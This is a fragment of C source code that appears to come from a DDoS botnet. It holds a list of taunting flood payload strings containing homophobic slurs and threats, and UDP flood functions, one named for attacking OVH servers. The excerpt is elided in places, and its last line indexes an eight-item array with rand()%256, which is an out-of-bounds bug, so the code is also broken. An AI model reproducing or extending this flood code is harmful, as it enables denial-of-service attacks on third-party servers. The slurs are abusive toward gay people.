...
char *bufToSend[] = {
    ...
    "chiyoontopchiyo",
    "chiyobyw00dy",
    "customstrbeastmodev69hitov69",
    "justgiveupurserverisgettingslammmmmed",
    "w00dyondiscordufuckingfag",
    "canugooff",
    "ovhdwnnnqueer",
    "nfoispoo100upalltheeway",
    "w00dywuzhere",
    "w00dyOnYaasscheek",
    "w00dyafiend",
    "IWillNullYourFridge",
...
void attack_udp_udphex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) // Shot by gay
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
...
void attack_method_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) // Shot by gay
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        char *leon_hex[] = {"\x30","\x30","\x30","\x30","\x34","\x30","\x30","\x30"};
        char *data = leon_hex[rand()%256];  
